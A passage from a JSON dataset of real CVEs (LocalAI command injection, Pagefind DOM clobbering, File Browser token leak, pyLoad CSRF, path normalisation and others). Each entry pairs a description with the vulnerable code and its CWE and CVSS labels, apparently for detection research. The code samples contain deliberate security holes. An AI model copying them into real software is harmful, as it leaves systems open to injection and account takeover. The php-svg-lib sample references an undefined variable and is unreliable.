          "content": "const fs = require(\"fs\");\nconst path = require(\"path\");\nconst { MimeDetector } = require(\"./mime\");\n\nfunction isTextType(filepath) {\n  try {\n    if (!fs.existsSync(filepath)) return false;\n    const mimeLib = new MimeDetector();\n    const mime = mimeLib.getType(filepath);\n    if (mimeLib.badMimes.includes(mime)) return false;\n\n    const type = mime.split(\"/\")[0];\n    if (mimeLib.nonTextTypes.includes(type)) return false;\n    return true;\n  } catch {\n    return false;\n  }\n}\n\nfunction trashFile(filepath) {\n  if (!fs.existsSync(filepath)) return;\n\n  try {\n    const isDir = fs.lstatSync(filepath).isDirectory();\n    if (isDir) return;\n  } catch {\n    return;\n  }\n\n  fs.rmSync(filepath);\n  return;\n}\n\nfunction createdDate(filepath) {\n  try {\n    const { birthtimeMs, birthtime } = fs.statSync(filepath);\n    if (birthtimeMs === 0) throw new Error(\"Invalid stat for file!\");\n    return birthtime.toLocaleString();\n  } catch {\n    return \"unknown\";\n  }\n}\n\nfunction writeToServerDocuments(\n  data = {},\n  filename,\n  destinationOverride = null\n) {\n  const destination = destinationOverride\n    ? path.resolve(destinationOverride)\n    : path.resolve(\n        __dirname,\n        \"../../../server/storage/documents/custom-documents\"\n      );\n  if (!fs.existsSync(destination))\n    fs.mkdirSync(destination, { recursive: true });\n  const destinationFilePath = path.resolve(destination, filename) + \".json\";\n\n  fs.writeFileSync(destinationFilePath, JSON.stringify(data, null, 4), {\n    encoding: \"utf-8\",\n  });\n\n  return {\n    ...data,\n    // relative location string that can be passed into the /update-embeddings api\n    // that will work since we know the location exists and since we only allow\n    // 1-level deep folders this will always work. This still works for integrations like GitHub and YouTube.\n    location: destinationFilePath.split(\"/\").slice(-2).join(\"/\"),\n  };\n}\n\n// When required we can wipe the entire collector hotdir and tmp storage in case\n// there were some large file failures that we unable to be removed a reboot will\n// force remove them.\nasync function wipeCollectorStorage() {\n  const cleanHotDir = new Promise((resolve) => {\n    const directory = path.resolve(__dirname, \"../../hotdir\");\n    fs.readdir(directory, (err, files) => {\n      if (err) resolve();\n\n      for (const file of files) {\n        if (file === \"__HOTDIR__.md\") continue;\n        try {\n          fs.rmSync(path.join(directory, file));\n        } catch {}\n      }\n      resolve();\n    });\n  });\n\n  const cleanTmpDir = new Promise((resolve) => {\n    const directory = path.resolve(__dirname, \"../../storage/tmp\");\n    fs.readdir(directory, (err, files) => {\n      if (err) resolve();\n\n      for (const file of files) {\n        if (file === \".placeholder\") continue;\n        try {\n          fs.rmSync(path.join(directory, file));\n        } catch {}\n      }\n      resolve();\n    });\n  });\n\n  await Promise.all([cleanHotDir, cleanTmpDir]);\n  console.log(`Collector hot directory and tmp storage wiped!`);\n  return;\n}\n\n/**\n * Checks if a given path is within another path.\n * @param {string} outer - The outer path (should be resolved).\n * @param {string} inner - The inner path (should be resolved).\n * @returns {boolean} - Returns true if the inner path is within the outer path, false otherwise.\n */\nfunction isWithin(outer, inner) {\n  if (outer === inner) return false;\n  const rel = path.relative(outer, inner);\n  return !rel.startsWith(\"../\") && rel !== \"..\";\n}\n\nfunction normalizePath(filepath = \"\") {\n  const result = path\n    .normalize(filepath.trim())\n    .replace(/^(\\.\\.(\\/|\\\\|$))+/, \"\")\n    .trim();\n  if ([\"..\", \".\", \"/\"].includes(result)) throw new Error(\"Invalid path.\");\n  return result;\n}\n\nmodule.exports = {\n  trashFile,\n  isTextType,\n  createdDate,\n  writeToServerDocuments,\n  wipeCollectorStorage,\n  normalizePath,\n  isWithin,\n};\n"
        }
      ],
      "method_level": [
        "function normalizePath(filepath = \"\") {\n  const result = path\n    .normalize(filepath.trim())\n    .replace(/^(\\.\\.(\\/|\\\\|$))+/, \"\")\n    .trim();\n  if ([\"..\", \".\", \"/\"].includes(result)) throw new Error(\"Invalid path.\");\n  return result;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 125,
          "content": "    .normalize(filepath.trim())"
        }
      ]
    },
    "cwe": [
      "CWE-29"
    ],
    "severity": "HIGH",
    "cvss_score": 7.2,
    "cvss_version": 3.1
  },
  {
    "id": 1145,
    "cve": "CVE-2024-45389",
    "description": "Pagefind, a fully static search library, initializes its dynamic JavaScript and WebAssembly files relative to the location of the first script the user loads. This information is gathered by looking up the value of `document.currentScript.src`. Prior to Pagefind version 1.1.1, it is possible to \"clobber\" this lookup with otherwise benign HTML on the page. This will cause `document.currentScript.src` to resolve as an external domain, which will then be used by Pagefind to load dependencies. This exploit would only work in the case that an attacker could inject HTML to a live, hosted, website. In these cases, this would act as a way to escalate the privilege available to an attacker. This assumes they have the ability to add some elements to the page (for example, `img` tags with a `name` attribute), but not others, as adding a `script` to the page would itself be the cross-site scripting vector. Pagefind has tightened this resolution in version 1.1.1 by ensuring the source is loaded from a valid script element. There are no reports of this being exploited in the wild via Pagefind.",
    "vulnerability": {
      "file_level": [
        {
          "name": "pagefind_ui/modular/modular-core.js",
          "content": "export { Input } from \"./components/input\";\nexport { ResultList } from \"./components/resultList\";\nexport { Summary } from \"./components/summary\";\nexport { FilterPills } from \"./components/filterPills\";\n\nconst sleep = async (ms = 50) =>\n  await new Promise((resolve) => setTimeout(resolve, ms));\n\nlet scriptBundlePath;\ntry {\n  scriptBundlePath = new URL(document.currentScript.src).pathname.match(\n    /^(.*\\/)(?:pagefind-)?modular-ui.js.*$/\n  )[1];\n} catch (e) {\n  scriptBundlePath = \"/pagefind/\";\n}\n\nexport class Instance {\n  constructor(opts = {}) {\n    this.__pagefind__ = null;\n    this.__initializing__ = null;\n    this.__searchID__ = 0;\n    this.__hooks__ = {\n      search: [],\n      filters: [],\n      loading: [],\n      results: [],\n    };\n\n    this.components = [];\n\n    this.searchTerm = \"\";\n    this.searchFilters = {};\n    this.searchResult = {};\n    this.availableFilters = null;\n    this.totalFilters = null;\n\n    this.options = {\n      bundlePath: opts.bundlePath ?? scriptBundlePath,\n      //TODO: USE resetStyles: opts.resetStyles ?? true,\n      //TODO: USE processResult: opts.processResult ?? null,\n      //TODO: USE processTerm: opts.processTerm ?? null,\n      mergeIndex: opts.mergeIndex ?? [],\n      //TODO: USE translations: opts.translations ?? [],\n    };\n\n    delete opts[\"bundlePath\"];\n    delete opts[\"resetStyles\"];\n    delete opts[\"processResult\"];\n    delete opts[\"processTerm\"];\n    delete opts[\"debounceTimeoutMs\"];\n    delete opts[\"mergeIndex\"];\n    delete opts[\"translations\"];\n\n    // Remove the UI-specific config before passing it along to the Pagefind backend\n    this.pagefindOptions = opts;\n  }\n\n  add(component) {\n    component?.register?.(this);\n    this.components.push(component);\n  }\n\n  on(event, callback) {\n    if (!this.__hooks__[event]) {\n      const supportedEvents = Object.keys(this.__hooks__).join(\", \");\n      console.error(\n        `[Pagefind Composable]: Unknown event type ${event}. Supported events: [${supportedEvents}]`\n      );\n      return;\n    }\n    if (typeof callback !== \"function\") {\n      console.error(\n        `[Pagefind Composable]: Expected callback to be a function, received ${typeof callback}`\n      );\n      return;\n    }\n    this.__hooks__[event].push(callback);\n  }\n\n  triggerLoad() {\n    this.__load__();\n    // this.components.forEach(component => component?.triggerLoad?.());\n  }\n\n  triggerSearch(term) {\n    this.searchTerm = term;\n    this.__dispatch__(\"search\", term, this.searchFilters);\n    this.__search__(term, this.searchFilters);\n  }\n\n  triggerSearchWithFilters(term, filters) {\n    this.searchTerm = term;\n    this.searchFilters = filters;\n    this.__dispatch__(\"search\", term, filters);\n    this.__search__(term, filters);\n  }\n\n  triggerFilters(filters) {\n    this.searchFilters = filters;\n    this.__dispatch__(\"search\", this.searchTerm, filters);\n    this.__search__(this.searchTerm, filters);\n  }\n\n  triggerFilter(filter, values) {\n    this.searchFilters = this.searchFilters || {};\n    this.searchFilters[filter] = values;\n    this.__dispatch__(\"search\", this.searchTerm, this.searchFilters);\n    this.__search__(this.searchTerm, this.searchFilters);\n  }\n\n  __dispatch__(e, ...args) {\n    this.__hooks__[e]?.forEach((hook) => hook?.(...args));\n  }\n\n  async __clear__() {\n    this.__dispatch__(\"results\", { results: [], unfilteredTotalCount: 0 });\n    this.availableFilters = await this.__pagefind__.filters();\n    this.totalFilters = this.availableFilters;\n    this.__dispatch__(\"filters\", {\n      available: this.availableFilters,\n      total: this.totalFilters,\n    });\n  }\n\n  async __search__(term, filters) {\n    this.__dispatch__(\"loading\");\n    await this.__load__();\n    const thisSearch = ++this.__searchID__;\n\n    if (!term || !term.length) {\n      return this.__clear__();\n    }\n\n    const results = await this.__pagefind__.search(term, { filters });\n    if (results && this.__searchID__ === thisSearch) {\n      if (results.filters && Object.keys(results.filters)?.length) {\n        this.availableFilters = results.filters;\n        this.totalFilters = results.totalFilters;\n        this.__dispatch__(\"filters\", {\n          available: this.availableFilters,\n          total: this.totalFilters,\n        });\n      }\n      this.searchResult = results;\n      this.__dispatch__(\"results\", this.searchResult);\n    }\n  }\n\n  async __load__() {\n    if (this.__initializing__) {\n      while (!this.__pagefind__) {\n        await sleep(50);\n      }\n      return;\n    }\n    this.__initializing__ = true;\n    if (!this.__pagefind__) {\n      let imported_pagefind;\n      try {\n        imported_pagefind = await import(\n          `${this.options.bundlePath}pagefind.js`\n        );\n      } catch (e) {\n        console.error(e);\n        console.error(\n          [\n            `Pagefind couldn't be loaded from ${this.options.bundlePath}pagefind.js`,\n            `You can configure this by passing a bundlePath option to PagefindComposable Instance`,\n            `[DEBUG: Loaded from ${\n              document?.currentScript?.src ?? \"no known script location\"\n            }]`,\n          ].join(\"\\n\")\n        );\n      }\n\n      await imported_pagefind.options(this.pagefindOptions || {});\n      for (const index of this.options.mergeIndex) {\n        if (!index.bundlePath) {\n          throw new Error(\"mergeIndex requires a bundlePath parameter\");\n        }\n        const url = index.bundlePath;\n        delete index[\"bundlePath\"];\n        await imported_pagefind.mergeIndex(url, index);\n      }\n      this.__pagefind__ = imported_pagefind;\n    }\n    this.availableFilters = await this.__pagefind__.filters();\n    this.totalFilters = this.availableFilters;\n    this.__dispatch__(\"filters\", {\n      available: this.availableFilters,\n      total: this.totalFilters,\n    });\n  }\n}\n"
        }
      ],
      "method_level": [
        "async __load__() {\n    if (this.__initializing__) {\n      while (!this.__pagefind__) {\n        await sleep(50);\n      }\n      return;\n    }\n    this.__initializing__ = true;\n    if (!this.__pagefind__) {\n      let imported_pagefind;\n      try {\n        imported_pagefind = await import(\n          `${this.options.bundlePath}pagefind.js`\n        );\n      } catch (e) {\n        console.error(e);\n        console.error(\n          [\n            `Pagefind couldn't be loaded from ${this.options.bundlePath}pagefind.js`,\n            `You can configure this by passing a bundlePath option to PagefindComposable Instance`,\n            `[DEBUG: Loaded from ${\n              document?.currentScript?.src ?? \"no known script location\"\n            }]`,\n          ].join(\"\\n\")\n        );\n      }\n\n      await imported_pagefind.options(this.pagefindOptions || {});\n      for (const index of this.options.mergeIndex) {\n        if (!index.bundlePath) {\n          throw new Error(\"mergeIndex requires a bundlePath parameter\");\n        }\n        const url = index.bundlePath;\n        delete index[\"bundlePath\"];\n        await imported_pagefind.mergeIndex(url, index);\n      }\n      this.__pagefind__ = imported_pagefind;\n    }\n    this.availableFilters = await this.__pagefind__.filters();\n    this.totalFilters = this.availableFilters;\n    this.__dispatch__(\"filters\", {\n      available: this.availableFilters,\n      total: this.totalFilters,\n    });\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 169,
          "content": "            `You can configure this by passing a bundlePath option to PagefindComposable Instance`,"
        },
        {
          "line_no": 170,
          "content": "            `[DEBUG: Loaded from ${"
        },
        {
          "line_no": 171,
          "content": "              document?.currentScript?.src ?? \"no known script location\""
        },
        {
          "line_no": 172,
          "content": "            }]`,"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.4,
    "cvss_version": 3.1
  },
  {
    "id": 577,
    "cve": "CVE-2024-2029",
    "description": "A command injection vulnerability exists in the `TranscriptEndpoint` of mudler/localai, specifically within the `audioToWav` function used for converting audio files to WAV format for transcription. The vulnerability arises due to the lack of sanitization of user-supplied filenames before passing them to ffmpeg via a shell command, allowing an attacker to execute arbitrary commands on the host system. Successful exploitation could lead to unauthorized access, data breaches, or other detrimental impacts, depending on the privileges of the process executing the code.",
    "vulnerability": {
      "file_level": [
        {
          "name": "backend/go/transcribe/transcript.go",
          "content": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"path/filepath\"\n\n\t\"github.com/ggerganov/whisper.cpp/bindings/go/pkg/whisper\"\n\t\"github.com/go-audio/wav\"\n\t\"github.com/go-skynet/LocalAI/core/schema\"\n)\n\nfunc sh(c string) (string, error) {\n\tcmd := exec.Command(\"/bin/sh\", \"-c\", c)\n\tcmd.Env = os.Environ()\n\to, err := cmd.CombinedOutput()\n\treturn string(o), err\n}\n\n// AudioToWav converts audio to wav for transcribe. It bashes out to ffmpeg\n// TODO: use https://github.com/mccoyst/ogg?\nfunc audioToWav(src, dst string) error {\n\tout, err := sh(fmt.Sprintf(\"ffmpeg -i %s -format s16le -ar 16000 -ac 1 -acodec pcm_s16le %s\", src, dst))\n\tif err != nil {\n\t\treturn fmt.Errorf(\"error: %w out: %s\", err, out)\n\t}\n\n\treturn nil\n}\n\nfunc Transcript(model whisper.Model, audiopath, language string, threads uint) (schema.Result, error) {\n\tres := schema.Result{}\n\n\tdir, err := os.MkdirTemp(\"\", \"whisper\")\n\tif err != nil {\n\t\treturn res, err\n\t}\n\tdefer os.RemoveAll(dir)\n\n\tconvertedPath := filepath.Join(dir, \"converted.wav\")\n\n\tif err := audioToWav(audiopath, convertedPath); err != nil {\n\t\treturn res, err\n\t}\n\n\t// Open samples\n\tfh, err := os.Open(convertedPath)\n\tif err != nil {\n\t\treturn res, err\n\t}\n\tdefer fh.Close()\n\n\t// Read samples\n\td := wav.NewDecoder(fh)\n\tbuf, err := d.FullPCMBuffer()\n\tif err != nil {\n\t\treturn res, err\n\t}\n\n\tdata := buf.AsFloat32Buffer().Data\n\n\t// Process samples\n\tcontext, err := model.NewContext()\n\tif err != nil {\n\t\treturn res, err\n\n\t}\n\n\tcontext.SetThreads(threads)\n\n\tif language != \"\" {\n\t\tcontext.SetLanguage(language)\n\t} else {\n\t\tcontext.SetLanguage(\"auto\")\n\t}\n\n\tif err := context.Process(data, nil, nil); err != nil {\n\t\treturn res, err\n\t}\n\n\tfor {\n\t\ts, err := context.NextSegment()\n\t\tif err != nil {\n\t\t\tbreak\n\t\t}\n\n\t\tvar tokens []int\n\t\tfor _, t := range s.Tokens {\n\t\t\ttokens = append(tokens, t.Id)\n\t\t}\n\n\t\tsegment := schema.Segment{Id: s.Num, Text: s.Text, Start: s.Start, End: s.End, Tokens: tokens}\n\t\tres.Segments = append(res.Segments, segment)\n\n\t\tres.Text += s.Text\n\t}\n\n\treturn res, nil\n}\n"
        }
      ],
      "method_level": [
        "func sh(c string) (string, error) {\n\tcmd := exec.Command(\"/bin/sh\", \"-c\", c)\n\tcmd.Env = os.Environ()\n\to, err := cmd.CombinedOutput()\n\treturn string(o), err\n}",
        "func audioToWav(src, dst string) error {\n\tout, err := sh(fmt.Sprintf(\"ffmpeg -i %s -format s16le -ar 16000 -ac 1 -acodec pcm_s16le %s\", src, dst))\n\tif err != nil {\n\t\treturn fmt.Errorf(\"error: %w out: %s\", err, out)\n\t}\n\n\treturn nil\n}"
      ],
      "hunk_level": [
        {
          "line_no": 14,
          "content": "func sh(c string) (string, error) {"
        },
        {
          "line_no": 15,
          "content": "\tcmd := exec.Command(\"/bin/sh\", \"-c\", c)"
        },
        {
          "line_no": 17,
          "content": "\to, err := cmd.CombinedOutput()"
        },
        {
          "line_no": 18,
          "content": "\treturn string(o), err"
        },
        {
          "line_no": 24,
          "content": "\tout, err := sh(fmt.Sprintf(\"ffmpeg -i %s -format s16le -ar 16000 -ac 1 -acodec pcm_s16le %s\", src, dst))"
        }
      ]
    },
    "cwe": [
      "CWE-78"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.0
  },
  {
    "id": 200,
    "cve": "CVE-2025-52901",
    "description": "File Browser provides a file managing interface within a specified directory and it can be used to upload, delete, preview, rename and edit files. Prior to version 2.33.9, access tokens are used as GET parameters. The JSON Web Token (JWT) which is used as a session identifier will get leaked to anyone having access to the URLs accessed by the user. This will give an attacker full access to a user's account and, in consequence, to all sensitive files the user has access to. This issue has been patched in version 2.33.9.",
    "vulnerability": {
      "file_level": [
        {
          "name": "frontend/src/api/commands.ts",
          "content": "import { removePrefix } from \"./utils\";\nimport { baseURL } from \"@/utils/constants\";\nimport { useAuthStore } from \"@/stores/auth\";\n\nconst ssl = window.location.protocol === \"https:\";\nconst protocol = ssl ? \"wss:\" : \"ws:\";\n\nexport default function command(\n  url: string,\n  command: string,\n  onmessage: WebSocket[\"onmessage\"],\n  onclose: WebSocket[\"onclose\"]\n) {\n  const authStore = useAuthStore();\n\n  url = removePrefix(url);\n  url = `${protocol}//${window.location.host}${baseURL}/api/command${url}?auth=${authStore.jwt}`;\n\n  const conn = new window.WebSocket(url);\n  conn.onopen = () => conn.send(command);\n  conn.onmessage = onmessage;\n  conn.onclose = onclose;\n}\n"
        }
      ],
      "method_level": [
        "command"
      ],
      "hunk_level": [
        {
          "line_no": 17,
          "content": "  url = `${protocol}//${window.location.host}${baseURL}/api/command${url}?auth=${authStore.jwt}`;"
        }
      ]
    },
    "cwe": [
      "CWE-598"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.5,
    "cvss_version": 3.1
  },
  {
    "id": 313,
    "cve": "CVE-2024-25117",
    "description": "php-svg-lib is a scalable vector graphics (SVG) file parsing/rendering library. Prior to version 0.5.2, php-svg-lib fails to validate that font-family doesn't contain a PHAR url, which might leads to RCE on PHP < 8.0, and doesn't validate if external references are allowed. This might leads to bypass of restrictions or RCE on projects that are using it, if they do not strictly revalidate the fontName that is passed by php-svg-lib. The `Style::fromAttributes(`), or the `Style::parseCssStyle()` should check the content of the `font-family` and prevents it to use a PHAR url, to avoid passing an invalid and dangerous `fontName` value to other libraries. The same check as done in the `Style::fromStyleSheets` might be reused. Libraries using this library as a dependency might be vulnerable to some bypass of restrictions, or even remote code execution, if they do not double check the value of the `fontName` that is passed by php-svg-lib. Version 0.5.2 contains a fix for this issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/Svg/Tag/Image.php",
          "content": "<?php\n/**\n * @package php-svg-lib\n * @link    http://github.com/PhenX/php-svg-lib\n * @author  Fabien Ménager <fabien.menager@gmail.com>\n * @license GNU LGPLv3+ http://www.gnu.org/copyleft/lesser.html\n */\n\nnamespace Svg\\Tag;\n\nuse Svg\\Style;\n\nclass Image extends AbstractTag\n{\n    protected $x = 0;\n    protected $y = 0;\n    protected $width = 0;\n    protected $height = 0;\n    protected $href = null;\n\n    protected function before($attributes)\n    {\n        parent::before($attributes);\n\n        $surface = $this->document->getSurface();\n        $surface->save();\n\n        $this->applyTransform($attributes);\n    }\n\n    public function start($attributes)\n    {\n        $height = $this->document->getHeight();\n        $width = $this->document->getWidth();\n        $this->y = $height;\n\n        if (isset($attributes['x'])) {\n            $this->x = $this->convertSize($attributes['x'], $width);\n        }\n        if (isset($attributes['y'])) {\n            $this->y = $height - $this->convertSize($attributes['y'], $height);\n        }\n\n        if (isset($attributes['width'])) {\n            $this->width = $this->convertSize($attributes['width'], $width);\n        }\n        if (isset($attributes['height'])) {\n            $this->height = $this->convertSize($attributes['height'], $height);\n        }\n\n        if (isset($attributes['xlink:href'])) {\n            $this->href = $attributes['xlink:href'];\n        }\n\n        if (isset($attributes['href'])) {\n            $this->href = $attributes['href'];\n        }\n\n        $this->document->getSurface()->transform(1, 0, 0, -1, 0, $height);\n\n        if ($from === \"font-family\") {\n            $scheme = \\strtolower(parse_url($this->href, PHP_URL_SCHEME) ?: \"\");\n            if (\n                $scheme === \"phar\" || \\strtolower(\\substr($this->href, 0, 7)) === \"phar://\"\n                || ($this->document->allowExternalReferences === false && $scheme !== \"data\")\n            ) {\n                return;\n            }\n        }\n\n        $this->document->getSurface()->drawImage($this->href, $this->x, $this->y, $this->width, $this->height);\n    }\n\n    protected function after()\n    {\n        $this->document->getSurface()->restore();\n    }\n} \n"
        }
      ],
      "method_level": [
        "public function start($attributes)\n    {\n        $height = $this->document->getHeight();\n        $width = $this->document->getWidth();\n        $this->y = $height;\n\n        if (isset($attributes['x'])) {\n            $this->x = $this->convertSize($attributes['x'], $width);\n        }\n        if (isset($attributes['y'])) {\n            $this->y = $height - $this->convertSize($attributes['y'], $height);\n        }\n\n        if (isset($attributes['width'])) {\n            $this->width = $this->convertSize($attributes['width'], $width);\n        }\n        if (isset($attributes['height'])) {\n            $this->height = $this->convertSize($attributes['height'], $height);\n        }\n\n        if (isset($attributes['xlink:href'])) {\n            $this->href = $attributes['xlink:href'];\n        }\n\n        if (isset($attributes['href'])) {\n            $this->href = $attributes['href'];\n        }\n\n        $this->document->getSurface()->transform(1, 0, 0, -1, 0, $height);\n\n        if ($from === \"font-family\") {\n            $scheme = \\strtolower(parse_url($this->href, PHP_URL_SCHEME) ?: \"\");\n            if (\n                $scheme === \"phar\" || \\strtolower(\\substr($this->href, 0, 7)) === \"phar://\"\n                || ($this->document->allowExternalReferences === false && $scheme !== \"data\")\n            ) {\n                return;\n            }\n        }\n\n        $this->document->getSurface()->drawImage($this->href, $this->x, $this->y, $this->width, $this->height);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 61,
          "content": "        if ($from === \"font-family\") {"
        },
        {
          "line_no": 62,
          "content": "            $scheme = \\strtolower(parse_url($this->href, PHP_URL_SCHEME) ?: \"\");"
        },
        {
          "line_no": 63,
          "content": "            if ("
        },
        {
          "line_no": 64,
          "content": "                $scheme === \"phar\" || \\strtolower(\\substr($this->href, 0, 7)) === \"phar://\""
        },
        {
          "line_no": 65,
          "content": "                || ($this->document->allowExternalReferences === false && $scheme !== \"data\")"
        },
        {
          "line_no": 66,
          "content": "            ) {"
        },
        {
          "line_no": 67,
          "content": "                return;"
        },
        {
          "line_no": 68,
          "content": "            }"
        }
      ]
    },
    "cwe": [
      "CWE-502",
      "CWE-610",
      "CWE-73"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_version": 3.1
  },
  {
    "id": 94,
    "cve": "CVE-2024-22416",
    "description": "pyLoad is a free and open-source Download Manager written in pure Python. The `pyload` API allows any API call to be made using GET requests. Since the session cookie is not set to `SameSite: strict`, this opens the library up to severe attack possibilities via a Cross-Site Request Forgery (CSRF) attack. As a result any API call can be made via a CSRF attack by an unauthenticated user. This issue has been addressed in release `0.5.0b3.dev78`. All users are advised to upgrade.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/pyload/webui/app/__init__.py",
          "content": "# -*- coding: utf-8 -*-\n#       ____________\n#   ___/       |    \\_____________ _                 _ ___\n#  /        ___/    |    _ __ _  _| |   ___  __ _ __| |   \\\n# /    \\___/  ______/   | '_ \\ || | |__/ _ \\/ _` / _` |    \\\n# \\            ◯ |      | .__/\\_, |____\\___/\\__,_\\__,_|    /\n#  \\_______\\    /_______|_|   |__/________________________/\n#           \\  /\n#            \\/\n\nimport os\n\nimport flask\nimport jinja2\nfrom werkzeug.serving import WSGIRequestHandler\n\nfrom .blueprints import BLUEPRINTS\nfrom .config import get_default_config\nfrom .extensions import EXTENSIONS, THEMES\nfrom .filters import TEMPLATE_FILTERS\nfrom .globals import TEMPLATE_GLOBALS\nfrom .handlers import ERROR_HANDLERS\nfrom .processors import CONTEXT_PROCESSORS\n\n\n#: flask app singleton?\nclass App:\n\n    JINJA_TEMPLATE_GLOBALS = TEMPLATE_GLOBALS\n    JINJA_TEMPLATE_FILTERS = TEMPLATE_FILTERS\n    JINJA_CONTEXT_PROCESSORS = CONTEXT_PROCESSORS\n    FLASK_ERROR_HANDLERS = ERROR_HANDLERS\n    FLASK_BLUEPRINTS = BLUEPRINTS\n    FLASK_EXTENSIONS = EXTENSIONS\n    FLASK_THEMES = THEMES\n\n\n    @classmethod\n    def _configure_config(cls, app, develop):\n        conf_obj = get_default_config(develop)\n        app.config.from_object(conf_obj)\n\n    @classmethod\n    def _configure_blueprints(cls, app, path_prefix):\n        for blueprint in cls.FLASK_BLUEPRINTS:\n            url_prefix = path_prefix if not blueprint.url_prefix else None\n            app.register_blueprint(blueprint, url_prefix=url_prefix)\n\n    @classmethod\n    def _configure_extensions(cls, app):\n        for extension in cls.FLASK_EXTENSIONS:\n            extension.init_app(app)\n\n    @classmethod\n    def _configure_themes(cls, app, path_prefix=\"\"):\n        for theme in cls.FLASK_THEMES:\n            theme.init_app(app, path_prefix)\n\n    @classmethod\n    def _configure_handlers(cls, app):\n        \"\"\"\n        Register app handlers.\n        \"\"\"\n        for exc, fn in cls.FLASK_ERROR_HANDLERS:\n            app.register_error_handler(exc, fn)\n\n        @app.after_request\n        def deny_iframe(response):\n            response.headers[\"X-Frame-Options\"] = \"DENY\"\n            return response\n\n    @classmethod\n    def _configure_json_encoding(cls, app):\n        try:\n            from .helpers import JSONProvider\n            app.json = JSONProvider(app)\n\n        except ImportError:\n            from .helpers import JSONEncoder\n            app.json_encoder = JSONEncoder\n\n    @classmethod\n    def _configure_templating(cls, app):\n        tempdir = app.config[\"PYLOAD_API\"].get_cachedir()\n        cache_path = os.path.join(tempdir, \"jinja\")\n\n        os.makedirs(cache_path, exist_ok=True)\n\n        app.create_jinja_environment()\n\n        # NOTE: enable auto escape for all file extensions (including .js)\n        #       maybe this will break .txt rendering, but we don't render this kind of files actually\n        #       that does not change 'default_for_string=False' (by default)\n        app.jinja_env.autoescape = jinja2.select_autoescape(default=True)\n        app.jinja_env.bytecode_cache = jinja2.FileSystemBytecodeCache(cache_path)\n\n        for fn in cls.JINJA_TEMPLATE_FILTERS:\n            app.add_template_filter(fn)\n\n        for fn in cls.JINJA_TEMPLATE_GLOBALS:\n            app.add_template_global(fn)\n\n        for fn in cls.JINJA_CONTEXT_PROCESSORS:\n            app.context_processor(fn)\n\n    @classmethod\n    def _configure_session(cls, app):\n        tempdir = app.config[\"PYLOAD_API\"].get_cachedir()\n        cache_path = os.path.join(tempdir, \"flask\")\n        os.makedirs(cache_path, exist_ok=True)\n\n        app.config[\"SESSION_FILE_DIR\"] = cache_path\n        app.config[\"SESSION_TYPE\"] = \"filesystem\"\n        app.config[\"SESSION_COOKIE_NAME\"] = \"pyload_session\"\n        app.config[\"SESSION_COOKIE_SAMESITE\"] = \"None\"\n        app.config[\"SESSION_COOKIE_SECURE\"] = app.config[\"PYLOAD_API\"].get_config_value(\"webui\", \"use_ssl\")\n        app.config[\"SESSION_PERMANENT\"] = False\n\n        session_lifetime = max(app.config[\"PYLOAD_API\"].get_config_value(\"webui\", \"session_lifetime\"), 1) * 60\n        app.config[\"PERMANENT_SESSION_LIFETIME\"] = session_lifetime\n\n    @classmethod\n    def _configure_api(cls, app, pycore):\n        app.config[\"PYLOAD_API\"] = pycore.api\n\n    @classmethod\n    def _configure_logging(cls, app, pycore):\n        # Inject our custom logger\n        app.logger = pycore.log.getChild(\"webui\")\n\n    def __new__(cls, pycore, develop=False, path_prefix=None):\n        app = flask.Flask(__name__)\n\n        cls._configure_logging(app, pycore)\n        cls._configure_api(app, pycore)\n        cls._configure_config(app, develop)\n        cls._configure_templating(app)\n        cls._configure_json_encoding(app)\n        cls._configure_session(app)\n        cls._configure_blueprints(app, path_prefix)\n        cls._configure_extensions(app)\n        cls._configure_themes(app, path_prefix or \"\")\n        cls._configure_handlers(app)\n\n        WSGIRequestHandler.protocol_version = \"HTTP/1.1\"\n\n        return app\n"
        }
      ],
      "method_level": [
        "def _configure_session(cls, app):\n        tempdir = app.config[\"PYLOAD_API\"].get_cachedir()\n        cache_path = os.path.join(tempdir, \"flask\")\n        os.makedirs(cache_path, exist_ok=True)\n\n        app.config[\"SESSION_FILE_DIR\"] = cache_path\n        app.config[\"SESSION_TYPE\"] = \"filesystem\"\n        app.config[\"SESSION_COOKIE_NAME\"] = \"pyload_session\"\n        app.config[\"SESSION_COOKIE_SAMESITE\"] = \"None\"\n        app.config[\"SESSION_COOKIE_SECURE\"] = app.config[\"PYLOAD_API\"].get_config_value(\"webui\", \"use_ssl\")\n        app.config[\"SESSION_PERMANENT\"] = False\n\n        session_lifetime = max(app.config[\"PYLOAD_API\"].get_config_value(\"webui\", \"session_lifetime\"), 1) * 60\n        app.config[\"PERMANENT_SESSION_LIFETIME\"] = session_lifetime"
      ],
      "hunk_level": [
        {
          "line_no": 115,
          "content": "        app.config[\"SESSION_COOKIE_SAMESITE\"] = \"None\""
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.6,
    "cvss_version": 3.1
  },
  {
    "id": 203,
    "cve": "CVE-2025-3108",
    "description": "A critical deserialization vulnerability exists in the run-llama/llama_index library's JsonPickleSerializer component, affecting versions v0.12.27 through v0.12.40. This vulnerability allows remote code execution due to an insecure fallback to Python's pickle module. JsonPickleSerializer prioritizes deserialization using pickle.loads(), which can execute arbitrary code when processing untrusted data. Attackers can exploit this by crafting malicious payloads to achieve full system compromise. The root cause includes an insecure fallback mechanism, lack of validation or safeguards, misleading design, and violation of Python security guidelines.",
    "vulnerability": {
      "file_level": [
        {
          "name": "llama-index-core/llama_index/core/workflow/context_serializers.py",
